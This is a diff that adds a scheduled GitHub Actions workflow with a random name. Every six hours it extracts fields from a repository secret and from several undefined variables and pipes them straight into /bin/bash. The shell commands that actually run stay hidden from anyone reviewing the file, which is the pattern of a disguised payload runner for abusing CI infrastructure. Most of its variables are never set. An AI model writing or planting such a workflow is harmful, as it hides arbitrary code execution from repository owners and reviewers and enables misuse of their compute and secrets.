@@ -1,0 +1,27 @@
+name: eihfual
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: eihfual
+        env:
+          k241: ${{ secrets.k241 }}
+        run: |
+          echo $k241 | jq -r .d253 | /bin/bash
+          echo $l7469 | jq -r .rptab073 | /bin/bash
+          echo $of4 | jq -r .gs28196 | /bin/bash
+          echo $timop2 | jq -r .q98582 | /bin/bash
+          echo $euo3 | jq -r .yjcyd5 | /bin/bash
+          echo $plag43 | jq -r .sp06 | /bin/bash
+          echo $vqc4 | jq -r .shzx586 | /bin/bash
+          echo $ur30289 | jq -r .hdbk15777 | /bin/bash
+          echo $unqhm27 | jq -r .g4 | /bin/bash
+
